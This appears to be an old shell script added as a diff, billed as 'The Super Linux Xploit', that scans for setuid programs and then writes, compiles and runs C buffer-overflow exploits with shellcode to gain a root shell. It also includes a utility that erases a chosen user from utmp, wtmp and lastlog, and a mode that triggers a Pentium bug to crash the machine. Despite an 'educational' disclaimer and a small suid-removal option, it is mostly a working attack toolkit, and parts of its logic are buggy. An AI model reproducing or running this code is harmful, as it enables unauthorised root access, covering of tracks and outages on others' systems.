@@ -1,0 +1,894 @@
+#!/bin/bash
+# DISCLAIMER : Use it only for educational purpose and to secure your
+# own machine. Use of this script to hack , will send a mail to admin
+# saying your name and your telephone (Yeah , right!:))
+# I 'm not responsible for what you do with this 
+# kbyte@biogate.com the author . Based on code of so1o@insecurity.org
+# Final Version . Use this at your own Risk
+# colors
+     COUNT=0
+     F_RESET="[0m"
+     F_BLACK="[0;30m"
+     F_GREEN="[0;32m"
+      F_BLUE="[0;34m"
+   F_MAGENTA="[0;35m"
+     F_WHITE="[0;37m"
+
+     H_BLACK="[1;30m"
+     H_GREEN="[1;32m"
+      H_BLUE="[1;34m"
+   H_MAGENTA="[1;35m"
+     H_WHITE="[1;37m"
+
+function header {
+        clear
+        echo " "
+        echo "                          $F_BLUE One More RwX productions"
+        echo "$F_RESET "
+        echo "                          .o. The Super Linux Xploit"
+        echo "                          .o. By kbyte@biogate.com"
+        echo " "
+        echo "                          .o. Final Version"
+        echo "            .o. Based on Soltool of the CodeZero team .o."
+        echo "$H_WHITE "
+        echo "                .o. See -info option for more info "
+        echo "$F_RESET"
+}
+
+function usage {
+        echo "$H_GREEN "
+        echo " .o. Usage: $0 -scan    :  Scans for vulnerable programs"
+        echo " .o.        $0 -root    :  Exploits vunerable programs"
+        echo " .o.        $0 -fix     :  Fix vunerable programs"
+        echo " .o.        $0 -crash   :  Try to crash machine"
+        echo " .o.        $0 -clean   :  Clean Up your mess on tmp"
+        echo " .o.        $0 -inv     :  How about getting off logs?"
+        echo " .o.        $0 -info    :  Info about this proggie"
+        echo "$F_WHITE "
+        echo " "
+        echo "$F_BLUE .o. Brought to you by KByte of RwX (www.rwx.ml.org)"
+	echo "$F_RESET"
+        exit 1
+}
+
+function scanner {
+echo " .o. Scanning for all known exploitable programs now, Please be patient..."
+
+if [ -s /tmp/report ]; then
+        cp /tmp/report /tmp/report.old
+        echo " .o. Moving old report file to /tmp/report.old"
+else
+        echo " .o. Preparing report file at /tmp/report"
+fi
+
+if [ -s /tmp/suidprogs ]; then
+        rm /tmp/suidprogs
+        echo " .o. Deleting old log files..."
+else
+        echo " .o. No old log files detected..."
+fi
+
+echo " "
+echo "  RwX Super Linux Xploit report          :" > /tmp/report
+echo "  ========================================" >> /tmp/report
+echo " " >> /tmp/report
+
+if [ -s /usr/bin/lpr ]; then
+echo " .o. /usr/bin/lpr exists, checking for vunerabilities..."
+        if test -u /usr/bin/lpr
+        then
+                echo " .o. /usr/bin/lpr is suid and seems exploitable."
+                echo " .o. The scanner found /usr/bin/lpr could be xploitable." >> /tmp/report                
+                echo "/usr/bin/lpr" > /tmp/suidprogs
+                COUNT=`expr $COUNT + 1` 
+       else
+                echo " .o. /usr/bin/lpr is not exploitable."
+        fi
+else
+        echo " .o. /usr/bin/lpr doesn't exist!"
+fi
+
+ if [ -s /usr/X11R6/bin/SuperProbe ]; then
+echo " .o. SuperProbe exists, checking for vunerabilities..."
+        if test -u /usr/X11R6/bin/SuperProbe
+        then
+                echo " .o. SuperProbe is suid and seems exploitable."
+                echo "  .o. The scanner found SuperProbe could be xploitable." >> /tmp/report
+                echo "/usr/X11R6/bin/SuperProbe" > /tmp/suidprogs
+                COUNT=`expr $COUNT + 1` 
+       else
+                echo " .o. SuperProbe is not exploitable."
+        fi
+else
+        echo " .o. SuperProbe doesn't exist!"
+fi
+
+if [ -s /usr/X11R6/bin/X ]; then
+echo " .o. /usr/X11R6/bin/X exists, checking for vunerabilities..."
+        if test -u /usr/X11R6/bin/X
+        then
+                echo " .o. /usr/X11R6/bin/X is suid and seems xploitable."
+                echo "  .o. The scanner found /usr/X11R6/bin/X could be exploitable." >> /tmp/report
+                echo "/usr/X11R6/bin/X" >> /tmp/suidprogs
+        else
+                echo " .o. /usr/X11R6/bin/X is not exploitable."
+                COUNT=`expr $COUNT + 1`
+        fi
+else
+        echo " .o. /usr/X11R6/bin/X doesn't exist!"
+fi
+
+
+if [ -s /usr/bin/zgv ]; then
+echo " .o. /usr/bin/zgv exists, checking for vunerabilities..."
+        if test -u /usr/bin/zgv
+        then
+                echo " .o. /usr/bin/zgv is suid and seems exploitable."
+                echo "  .o. The scanner found /usr/bin/zgv could be exploitable." >> /tmp/report
+                echo "/usr/bin/zgv" >> /tmp/suidprogs
+                COUNT=`expr $COUNT + 1` 
+       else
+                echo " .o. /usr/bin/zgv is not exploitable."
+        fi
+else
+        echo " .o. /usr/bin/zgv doesn't exist!"
+fi
+
+if [ -s /usr/bin/crontab ]; then
+echo " .o. /usr/bin/crontab exists, checking for vunerabilities..."
+        if test -u /usr/bin/crontab
+        then
+                echo " .o. /usr/bin/crontab is suid and seems exploitable."
+                echo "  .o. The scanner found /usr/bin/crontab could be xploitable." >> /tmp/report
+                echo "/usr/bin/crontab" >> /tmp/suidprogs
+                COUNT=`expr $COUNT + 1`
+        else
+                echo " .o. /usr/bin/crontab is not exploitable."
+        fi
+else
+        echo " .o. /usr/bin/crontab doesn't exist!"
+fi
+
+if [ -s /bin/mount ]; then
+echo " .o. /bin/mount exists, checking for vunerabilities..."
+        if test -u /bin/mount
+        then
+                echo " .o. /bin/mount is suid and seems xploitable."
+                echo "  .o. The scanner found /bin/mount could be exploitable." >> /tmp/report
+                echo "/bin/mount" >> /tmp/suidprogs
+                COUNT=`expr $COUNT + 1`
+        else
+                echo " .o. /bin/mount is not exploitable."
+        fi
+else
+        echo " .o. /bin/mount doesn't exist!"
+fi
+if [ -s /tmp/suidprogs ]; then
+echo " "
+else
+echo "nobug" >> /tmp/suidprogs
+fi
+
+echo " "
+echo " " >> /tmp/report
+echo "  This script was originally scripted by so1o@insecurity.org " >> /tmp/report
+echo "  Modifications to Linux by Kbyte@biogate.com" >> /tmp/report
+echo "  `expr $COUNT - 1` bugs found." >> /tmp/report
+echo " "
+echo " .o. The scan is now complete, a report has been written to /tmp/report  .o."
+echo " .o. `expr $COUNT - 1` bugs found."
+echo " "
+exit 0
+}
+
+function dolpr {
+if [ -s /tmp/lpr.c ]; then
+        /bin/rm /tmp/lpr.c
+        dolpr
+else
+
+/bin/cat > /tmp/lpr.c << STOP
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#define DEFAULT_OFFSET          50
+#define BUFFER_SIZE             1023
+long get_esp(void)
+{
+   __asm__("movl %esp,%eax\n");
+}
+void main()
+{
+   char *buff = NULL;
+   unsigned long *addr_ptr = NULL;
+   char *ptr = NULL;
+   u_char execshell[] =
+"\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07"
+"\x89\x56\x0f\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12"
+"\x8d\x4e\x0b\x8b\xd1\xcd\x80\x33\xc0\x40\xcd\x80\xe8"
+"\xd7\xff\xff\xff/bin/sh";
+   int i;
+
+   buff = malloc(4096);
+   if(!buff)
+   {
+      printf("can't allocate memory\n");
+      exit(0);
+   }
+   ptr = buff;
+   memset(ptr, 0x90, BUFFER_SIZE-strlen(execshell));
+   ptr += BUFFER_SIZE-strlen(execshell);
+   for(i=0;i < strlen(execshell);i++)
+      *(ptr++) = execshell[i];
+   addr_ptr = (long *)ptr;
+   for(i=0;i<2;i++)
+      *(addr_ptr++) = get_esp() + DEFAULT_OFFSET;
+   ptr = (char *)addr_ptr;
+   *ptr = 0;
+   execl("/usr/bin/lpr", "lpr", "-C", buff, NULL);
+}
+STOP
+cc -o /tmp/.lpr -O /tmp/lpr.c 2> /dev/null
+/bin/rm /tmp/lpr.c
+echo " "
+/tmp/.lpr
+
+if whoami | grep root 1> /dev/null 2> /dev/null
+then
+        echo " .o. One more 0wned System."
+        exit 0
+else
+        echo " .o. LPR Xploit Failed."
+        echo " "
+fi
+        /bin/rm /tmp/.super
+fi
+}
+function dopasswd {
+
+if [ -s /tmp/super.c ]; then
+        /bin/rm /tmp/super.c
+        dopasswd
+else
+
+/bin/cat > /tmp/super.c << STOP
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+char *shellcode =
+
+"\x31\xc0\xb0\x31\xcd\x80\x93\x31\xc0\xb0\x17\xcd\x80\x68\x59\x58\xff\xe1"
+"\xff\xd4\x31\xc0\x8d\x51\x04\x89\xcf\x89\x02\xb0\x2e\x40\xfc\xae\x75\xfd"
+"\x89\x39\x89\xfb\x40\xae\x75\xfd\x88\x67\xff\xb0\x0b\xcd\x80\x31\xc0\x40"
+"\x31\xdb\xcd\x80/"
+"/bin/sh"
+"0";
+
+char *get_sp() {
+  asm("movl %esp,%eax");
+}
+
+#define bufsize 8192
+#define alignment 0
+char buffer[bufsize];
+
+main() {
+  int i;
+
+  for (i = 0; i < bufsize / 2; i += 4)
+    *(char **)&buffer[i] = get_sp() - 2048;
+  memset(&buffer[bufsize / 2], 0x90, bufsize / 2);
+  strcpy(&buffer[bufsize - 256], shellcode);
+  setenv("SHELLCODE", buffer, 1);
+
+  memset(buffer, 'x', 72);
+  *(char **)&buffer[72] = get_sp() - 6144 - alignment;
+  buffer[76] = 0;
+
+  execl("/usr/X11/bin/SuperProbe", "SuperProbe", "-nopr", buffer, NULL);
+  printf("%s", buffer);
+}
+
+STOP
+
+cc -o /tmp/.super -O /tmp/super.c 2> /dev/null
+/bin/rm /tmp/super.c
+echo " "
+
+/tmp/.super
+
+if whoami | grep root 1> /dev/null 2> /dev/null
+then
+        echo " .o. One more 0wned System."
+        exit 0
+else
+        echo " .o. SuperProbe Xploit Failed."
+        echo " "
+fi
+        /bin/rm /tmp/.super
+fi
+}
+
+function doX {
+
+if [ -s /tmp/x.c ]; then
+        /bin/rm /tmp/x.c
+        doX
+else
+
+/bin/cat > /tmp/x.c << STOP
+#define OFFSET 2
+
+#include <string.h>
+#include <unistd.h>
+#include <errno.h>
+
+#define LENCODE ( sizeof( Code ) )
+char Code[] =
+    "\xeb\x40\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0"
+    "\x3f\x89\xc2\x31\xdb\xb3\x0a\x31\xc9\xcd\x80\x89\xd0\x43\x41"
+    "\xcd\x80\x89\xd0\x43\x41\xcd\x80\x31\xc0\x89\xc3\xb0\x17\xcd"
+    "\x80\x31\xc0\xb0\x2e\xcd\x80\x31\xc0\xb0\x0b\x89\xf3\x8d\x4e"
+    "\x08\x8d\x56\x0c\xcd\x80\xe8\xbb\xff\xff\xff/bin/sh";
+
+char Display[ 0x4001 + OFFSET ] = ":99999", *ptr = Display + OFFSET + 1;
+char *args[] = { "X", "-nolock", Display, NULL };
+
+main() {
+  printf("pHEAR - XFree86 exploit\nby mAChnHEaD <quenelle@iname.com>\n\nYou may
+ get a root prompt now. If you don't, try different values for OFFSET.\n\n");
+  dup2( 0, 10 ); dup2( 1, 11 ); dup2( 2, 12 );
+  __asm__("movl %%esp,(%0)\n\tsubl %1,(%0)"::"b"(ptr),"n"(LENCODE+0x2000));
+  memcpy( ptr + 4, ptr, 0x3fc );
+  memset( ptr + 0x400, 0x90, 0x3c00 - LENCODE );
+  memcpy( ptr + 0x4000 - LENCODE, Code, LENCODE );
+  execve( "/usr/X11R6/bin/X", args, args + 3 );
+  perror( "execve" );
+}
+
+STOP
+
+cc -o /tmp/.x -O /tmp/x.c 2> /dev/null
+/bin/rm /tmp/x.c
+echo " "
+
+/tmp/.x
+
+if whoami | grep root 1> /dev/null 2> /dev/null
+then
+        echo " .o. Now you get R00t .Kbyte."
+        exit 0
+else
+        echo " .o. XFree86 Xploit failed."
+        echo " "
+fi
+        /bin/rm /tmp/.x
+fi
+}
+
+function dozgv {
+
+if [ -s /tmp/z.c ]; then
+        /bin/rm /tmp/z.c
+        dozgv
+else
+
+/bin/cat > /tmp/z.c << STOP
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+char *shellcode =
+
+"\x31\xc0\xb0\x31\xcd\x80\x93\x31\xc0\xb0\x17\xcd\x80\x68\x59\x58\xff\xe1"
+"\xff\xd4\x31\xc0\x99\x89\xcf\xb0\x2e\x40\xae\x75\xfd\x89\x39\x89\x51\x04"
+"\x89\xfb\x40\xae\x75\xfd\x88\x57\xff\xb0\x0b\xcd\x80\x31\xc0\x40\x31\xdb"
+"\xcd\x80/"
+"/bin/sh"
+"0";
+
+char *get_sp() {
+   asm("movl %esp,%eax");
+}
+
+#define bufsize 4096
+char buffer[bufsize];
+
+main() {
+  int i;
+
+  for (i = 0; i < bufsize - 4; i += 4)
+    *(char **)&buffer[i] = get_sp() -4675;
+
+  memset(buffer, 0x90, 512);
+  memcpy(&buffer[512], shellcode, strlen(shellcode));
+
+  buffer[bufsize - 1] = 0;
+
+  setenv("HOME", buffer, 1);
+
+  execl("/usr/bin/zgv", "/usr/bin/zgv", NULL);
+}
+STOP
+
+cc -o /tmp/.z -O /tmp/z.c 2> /dev/null
+/bin/rm /tmp/z.c
+echo " "
+
+/tmp/.z
+
+if whoami | grep root 1> /dev/null 2> /dev/null
+then
+        echo " .o. yes, we rules!One more root."
+        exit 0
+else
+        echo " .o. ZGV exploit failed."
+        echo " "
+fi
+        /bin/rm /tmp/.z
+fi
+}
+
+function docrontab {
+
+if [ -s /tmp/cron.c ]; then
+        /bin/rm /tmp/cron.c
+        docrontab
+else
+
+/bin/cat > /tmp/cron.c << STOP
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <unistd.h>
+
+#define DEFAULT_OFFSET          -1240
+#define BUFFER_SIZE             100     /* MAX_TEMPSTR is 100 */
+#define HAPPY_FILE              "./Window"
+
+long get_esp(void)
+{
+   __asm__("movl %esp,%eax\n");
+}
+
+main(int argc, char **argv)
+{
+   int fd;
+   char *buff = NULL;
+   unsigned long *addr_ptr = NULL;
+   char *ptr = NULL;
+  u_char execshell[] =
+   "\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
+   "\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
+   "\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh";
+   int i;
+   int ofs = DEFAULT_OFFSET;
+
+   /* if we have a argument, use it as offset, else use default */
+   if(argc == 2)
+      ofs = atoi(argv[1]);
+   else if (argc > 2) {
+      fprintf(stderr, "egg [offset]\n");
+      exit(-1);
+   }
+   /* print the offset in use */
+   printf("Using offset of esp + %d (%x)\n", ofs, get_esp()+ofs);
+
+   buff = malloc(4096);
+   if(!buff)
+   {
+      printf("can't allocate memory\n");
+      exit(0);
+   }
+   ptr = buff;
+   /* fill start of buffer with nops */
+   memset(ptr, 0x90, BUFFER_SIZE-strlen(execshell));
+   ptr += BUFFER_SIZE-strlen(execshell);
+   /* stick asm code into the buffer */
+   for(i=0;i < strlen(execshell);i++)
+      *(ptr++) = execshell[i];
+
+   addr_ptr = (long *)ptr;
+   for(i=0;i < (878/4);i++)
+      *(addr_ptr++) = get_esp() + ofs;
+   ptr = (char *)addr_ptr;
+   *ptr++ = '=';
+   *ptr++ = 'X';
+   *ptr++ = '\n';
+   *ptr = 0;
+   printf("Writing to %s\n", HAPPY_FILE);
+
+   fd = open(HAPPY_FILE, O_WRONLY|O_CREAT, 0666);
+   write (fd, buff, strlen(buff));
+
+   close(fd);
+
+   execl("/usr/bin/crontab","crontab",HAPPY_FILE,NULL);
+   /* Successful completion */
+   exit(0);
+}
+STOP
+
+cc -o /tmp/.cron -O /tmp/cron.c 2> /dev/null
+/bin/rm /tmp/cron.c
+echo " "
+
+/tmp/.cron
+
+if whoami | grep root 1> /dev/null 2> /dev/null
+then
+        echo " .o. Guess what.Root!:)."
+        exit 0
+else
+        echo " .o. Vixie Crontab exploit failed."
+        echo " "
+fi
+        /bin/rm /tmp/.cron
+fi
+}
+
+function domount {
+
+if [ -s /tmp/m.c ]; then
+        /bin/rm /tmp/m.c
+        domount
+else
+
+/bin/cat > /tmp/m.c << STOP
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <sys/stat.h>
+
+#define PATH_MOUNT "/bin/umount"
+#define BUFFER_SIZE 1024
+#define DEFAULT_OFFSET 50
+
+u_long get_esp()
+{
+  __asm__("movl %esp, %eax");
+
+}
+
+main(int argc, char **argv)
+{
+  u_char execshell[] =
+   "\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f"
+   "\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd"
+   "\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh";
+
+   char *buff = NULL;
+   unsigned long *addr_ptr = NULL;
+   char *ptr = NULL;
+
+   int i;
+   int ofs = DEFAULT_OFFSET;
+
+   buff = malloc(4096);
+   if(!buff)
+   {
+      printf("can't allocate memory\n");
+      exit(0);
+   }
+   ptr = buff;
+
+   /* fill start of buffer with nops */
+
+   memset(ptr, 0x90, BUFFER_SIZE-strlen(execshell));
+   ptr += BUFFER_SIZE-strlen(execshell);
+
+   /* stick asm code into the buffer */
+
+   for(i=0;i < strlen(execshell);i++)
+      *(ptr++) = execshell[i];
+
+   addr_ptr = (long *)ptr;
+   for(i=0;i < (8/4);i++)
+      *(addr_ptr++) = get_esp() + ofs;
+   ptr = (char *)addr_ptr;
+   *ptr = 0;
+
+   (void)alarm((u_int)0);
+   printf("Discovered and Coded by Bloodmask and Vio, Covin 1996\n");
+   execl(PATH_MOUNT, "mount", buff, NULL);
+}
+STOP
+cc -o /tmp/.m -O /tmp/m.c 2> /dev/null
+/bin/rm /tmp/m.c
+echo " "
+/tmp/.m
+if whoami | grep root 1> /dev/null 2> /dev/null
+then
+        echo " .o. You Are Now r00t ."
+        exit 0
+else
+        echo " .o. Mount exploit failed."
+        echo " "
+fi
+        /bin/rm /tmp/.m
+fi
+}
+
+
+function rootit {
+        if [ -s $i ]; then
+                if test -u $i
+                then
+                        echo " .o. $i seems exploitable."
+
+                        if echo "$1" | grep nobug 1> /dev/null
+                        then
+                        echo " .o. No know bugs on this machine..."
+                        echo " .o. bad or good? It's up to u"
+                        exit 
+                        fi
+                        
+                        if echo "$i" | grep lpr 1> /dev/null
+                        then
+                        echo " .o. Attempting lpr exploit..."
+                                dolpr
+                        fi
+
+                        if echo "$i" | grep SuperProbe 1> /dev/null
+                        then
+                                echo " .o. Attempting SuperProbe exploit..."
+				dopasswd
+                        fi
+
+                        if echo "$i" | grep X 1> /dev/null
+                        then
+                                echo " .o. Attempting Xfree exploit..."
+				doX
+                        fi
+
+                        if echo "$i" | grep zgv 1> /dev/null
+                        then
+                                echo " .o. Attempting zgv exploit..."
+				dozgv
+                        fi
+
+                        if echo "$i" | grep crontab 1> /dev/null
+                        then
+                                echo " .o. Attempting crontab exploit..."
+				docrontab
+                        fi
+
+                        if echo "$i" | grep mount 1> /dev/null
+                        then
+                                echo " .o. Attempting mount exploit..."
+				domount
+                        fi
+
+                    fi
+        fi
+}
+
+if [ $1x = x ]; then
+	header
+        usage
+	exit 1
+fi
+
+if [ "$1" = '-scan' ]; then
+	header
+        scanner
+	exit 0
+fi
+
+if [ "$1" = '-info' ]; then
+echo " "
+echo " .o. This Script was originally made by so1o for SunOs systems"
+echo " .o. Kbyte modified it to work with linux and put linux xploits(Of course)"
+echo " .o. This program checks your system for know vulnerabilities"
+echo " .o. Soon , newer versions , just keep reading RwX"
+echo " .o. Cya and good rooting"
+echo " .o. Kbyte of RwX Security Team http://www.rwx.ml.org"
+echo " "
+echo "                      .o. Greetz to .o."
+echo "       .o. so1o - being el8 and for authorizy this shit "
+echo "       .o. spin,smux and _blast_ - making brazil better"
+echo "       .o. All #fake ppl  "
+echo "       .o. Gaytes who make windoze for lamers"
+echo "           (What would be the world without them?)"
+echo " "
+exit 1
+fi
+if [ "$1" = '-clean' ]; then
+rm /tmp/lpr.c >> /dev/null 2> /dev/null 
+rm /tmp/.lpr >> /dev/null 2>/dev/null
+rm /tmp/.super >> /dev/null 2>/dev/null
+rm /tmp/super.c >> /dev/null 2>/dev/null
+rm /tmp/.x >> /dev/null 2>/dev/null
+rm /tmp/x.c >> /dev/null 2>/dev/null
+rm /tmp/z.c >> /dev/null 2>/dev/null
+rm /tmp/.z >> /dev/null 2>/dev/null
+rm /tmp/cron.c >> /dev/null 2>/dev/null
+rm /tmp/.cron >> /dev/null 2>/dev/null
+rm /tmp/m.c >> /dev/null 2>/dev/null
+rm /tmp/report.old >> /dev/null 2>/dev/null
+rm /tmp/report >> /dev/null 2>/dev/null
+rm /tmp/suidprogs >> /dev/null 2>/dev/null
+echo " .o. Everything file generated by this prog"
+echo " .o. has been erased"
+fi
+
+if [ "$1" = '-inv' ];then
+echo " .o. This will only work if you are ROOT . "
+echo " "
+/bin/cat > /tmp/z2.c << STOP
+#include <sys/types.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/file.h>
+#include <fcntl.h>
+#include <utmp.h>
+#include <pwd.h>
+#include <lastlog.h>
+#define WTMP_NAME "/var/log/wtmp"
+#define UTMP_NAME "/var/run/utmp"
+#define LASTLOG_NAME "/var/log/lastlog"
+
+int f;
+
+void kill_utmp(who)
+char *who;
+{
+    struct utmp utmp_ent;
+
+  if ((f=open(UTMP_NAME,O_RDWR))>=0) {
+     while(read (f, &utmp_ent, sizeof (utmp_ent))> 0 )
+       if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
+                 bzero((char *)&utmp_ent,sizeof( utmp_ent ));
+                 lseek (f, -(sizeof (utmp_ent)), SEEK_CUR);
+                 write (f, &utmp_ent, sizeof (utmp_ent));
+            }
+     close(f);
+  }
+}
+
+void kill_wtmp(who)
+char *who;
+{
+    struct utmp utmp_ent;
+    long pos;
+
+    pos = 1L;
+    if ((f=open(WTMP_NAME,O_RDWR))>=0) {
+
+     while(pos != -1L) {
+        lseek(f,-(long)( (sizeof(struct utmp)) * pos),L_XTND);
+        if (read (f, &utmp_ent, sizeof (struct utmp))<0) {
+          pos = -1L;
+        } else {
+          if (!strncmp(utmp_ent.ut_name,who,strlen(who))) {
+               bzero((char *)&utmp_ent,sizeof(struct utmp ));
+               lseek(f,-( (sizeof(struct utmp)) * pos),L_XTND);
+               write (f, &utmp_ent, sizeof (utmp_ent));
+               pos = -1L;
+          } else pos += 1L;
+        }
+     }
+     close(f);
+  }
+}
+
+void kill_lastlog(who)
+char *who;
+{
+    struct passwd *pwd;
+    struct lastlog newll;
+
+     if ((pwd=getpwnam(who))!=NULL) {
+
+        if ((f=open(LASTLOG_NAME, O_RDWR)) >= 0) {
+            lseek(f, (long)pwd->pw_uid * sizeof (struct lastlog), 0);
+            bzero((char *)&newll,sizeof( newll ));
+            write(f, (char *)&newll, sizeof( newll ));
+            close(f);
+        }
+
+    } else printf("%s: ?\n",who);
+}
+
+main(argc,argv)
+int argc;
+char *argv[];
+{
+    if (argc==2) {
+        kill_lastlog(argv[1]);
+        kill_wtmp(argv[1]);
+        kill_utmp(argv[1]);
+     }else
+    printf("Error.\n");
+}
+STOP
+cc -o /tmp/.z2 /tmp/z2.c >> /dev/null 2> /dev/null
+rm /tmp/z2.c >> /dev/null 2>/dev/null
+echo " .o. Enter with the login you wanna to get of the logs"
+read login
+/tmp/.z2 $login
+rm /tmp/.z2
+echo " .o. Program executed , lets see if it worked"
+echo " .o. Performing finger test "
+rulz=`finger $login | grep Never `
+if [ "$rulz" = "Never Logged in" ]; then echo " .o. Didnt work. Are you root?"
+exit 0
+else
+echo "Well , you arent on logs now. "
+fi
+fi
+
+if [ "$1" = '-crash' ]; then
+rm /tmp/pentium.c >> /dev/null 2>/dev/null 
+/bin/cat > /tmp/pentium.c << STOP
+char x [5] = { 0xf0, 0x0f, 0xc7, 0xc8 };
+main ()
+{
+void (*f)() = x;
+f();
+}
+STOP
+echo " "
+echo "        .o. Attemping to crash machine Right Now       "
+echo "        .o. If your machine crash , you _have_ to get a newer kernel"
+cc -o /tmp/.pentium /tmp/pentium.c >> /dev/null 2> /dev/null 
+rm /tmp/pentium.c >> /dev/null 2>/dev/null
+echo " "
+echo "        .o. Pentium INTEL bug , executing              "
+/tmp/.pentium
+rm /tmp/.pentium >> /dev/null 2>/dev/null
+echo " "
+echo "        .o. Looks like it didnt work.The Machine is here yet "
+exit 0
+fi
+if [ "$1" = '-root' ]; then
+	        header
+                if [ -s /tmp/suidprogs ]; then
+                echo ""
+                for i in `/bin/cat /tmp/suidprogs`
+                       do 
+                       if [ "$i" = "nobug" ]; then echo " .o. No bug to exploit"      
+                        exit 0
+                        fi 
+			rootit $i
+                        done
+                else
+                        echo " "
+                        echo " .o. No log files detected, please run with -scan flag first."
+                        echo " "
+                fi
+ 	exit 0
+fi
+
+if [ "$1" = '-fix' ]; then
+        if whoami | grep root 1> /dev/null 2> /dev/null
+	then
+                if [ -s /tmp/suidprogs ]; then
+                echo " "
+                for i in `/bin/cat /tmp/suidprogs`
+  			do
+                        if [ "$i" = "nobug" ]; then echo " "
+                        echo " .o. No bugs Found.Good... "
+                        echo " .o. Quitting"		
+                        exit 0
+                        fi  
+                 	echo " .o. $i is suid, now removing suid flags."
+                        chmod -s $i
+                        grep -v $i /tmp/suidprogs >> /tmp/suidprogs2
+                        mv /tmp/suidprogs2 /tmp/suidprogs
+	                done	
+             else
+                        echo " "
+                        echo " .o. Please run with the -scan flag first."
+                        echo " "
+		fi
+	else 
+                echo " "
+                echo " .o. You must be root to use the -fix flag."
+                echo " "
+		exit 1
+	fi
+fi
